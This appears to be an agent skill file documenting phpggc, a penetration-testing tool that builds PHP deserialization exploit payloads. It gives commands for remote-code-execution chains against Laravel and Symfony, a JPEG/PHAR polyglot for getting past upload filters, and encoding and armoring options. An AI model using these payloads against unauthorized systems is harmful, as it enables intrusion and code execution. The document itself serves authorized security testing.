---
name: phpggc
description: Generate payloads for exploiting unsafe PHP object deserialization vulnerabilities. PHPGGC (PHP Generic Gadget Chains) contains a library of gadget chains for popular frameworks like Laravel, Symfony, and Drupal. Use when testing for PHP deserialization flaws, generating PHAR polyglots, or crafting RCE payloads for web applications.
---

# phpggc

## Overview
PHPGGC is a library of PHP gadget chains and a command-line tool to generate payloads for exploiting unsafe object deserialization. It supports various frameworks and provides numerous enhancements like fast-destruct and string armoring to bypass filters. Category: Web Application Testing / Exploitation.

## Installation (if not already installed)
Assume phpggc is already installed. If you get a "command not found" error:

```bash
sudo apt update
sudo apt install phpggc
```
Requires `php-cli`.

## Common Workflows

### List available gadget chains
```bash
phpggc -l
```
Filter for a specific framework:
```bash
phpggc -l laravel
```

### Generate a basic RCE payload
Generate a payload for Laravel/RCE1 that executes `id`:
```bash
phpggc Laravel/RCE1 system id
```

### Generate a Base64 encoded payload for a URL parameter
```bash
phpggc -b Laravel/RCE1 system "whoami"
```

### Create a PHAR polyglot (JPEG)
Hide a PHAR payload inside a valid JPEG image to bypass file upload restrictions:
```bash
phpggc -p phar -pj image.jpg -o exploit.jpg Laravel/RCE1 system "id"
```

### Use Fast-Destruct
Forces the object to be destroyed immediately after `unserialize()`, useful if the script crashes or exits before the end:
```bash
phpggc -f Symfony/RCE1 system "id"
```

## Complete Command Reference

```bash
phpggc [Options] <GadgetChain> [arguments]
```

### Information Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Displays help message |
| `-l`, `--list [filter]` | Lists available gadget chains (optional filter) |
| `-i`, `--information` | Displays detailed information about a specific gadget chain |

### Output Options
| Flag | Description |
|------|-------------|
| `-o`, `--output <file>` | Outputs the payload to a file instead of stdout |

### PHAR Options
| Flag | Description |
|------|-------------|
| `-p`, `--phar <tar\|zip\|phar>` | Creates a PHAR file of the given format |
| `-pj`, `--phar-jpeg <file>` | Creates a polyglot JPEG/PHAR file from given image |
| `-pp`, `--phar-prefix <file>` | Sets PHAR prefix from file (used with `-p phar` to control file start) |
| `-pf`, `--phar-filename <name>` | Defines the name of the file inside the PHAR (default: test.txt) |

### Enhancement Options
| Flag | Description |
|------|-------------|
| `-f`, `--fast-destruct` | Applies fast-destruct (object destroyed right after unserialize) |
| `-a`, `--ascii-strings` | Uses 'S' format for non-printable chars (hex representation) |
| `-A`, `--armor-strings` | Uses 'S' format for EVERY char (hex representation); results in 3x size |
| `-n`, `--plus-numbers <types>` | Adds `+` before numbers of type (e.g., `-n iO` for int and object size) |
| `-w`, `--wrapper <file>` | Specifies a PHP file containing wrapper functions (`process_parameters`, `process_object`, `process_serialized`) |

### Encoding Options
| Flag | Description |
|------|-------------|
| `-s`, `--soft` | Soft URLencode |
| `-u`, `--url` | URLencodes the payload |
| `-b`, `--base64` | Converts output to Base64 |
| `-j`, `--json` | Converts output to JSON |
*Note: Encoders can be chained (e.g., `-b -u -u`).*

### Creation & Testing
| Flag | Description |
|------|-------------|
| `-N`, `--new <fw> <type>` | Creates file structure for a new gadgetchain (e.g., `-N Drupal RCE`) |
| `--test-payload` | Includes vendor/autoload.php and unserializes the payload locally for testing |

## Notes
- **Warning**: Using `--test-payload` will execute the generated payload on **your** system.
- Since PHP 7.2, the `-n` (plus-numbers) option only supports `i` (integer) and `d` (float) types.
- The `-a` and `-A` options are experimental and may not work in all PHP environments.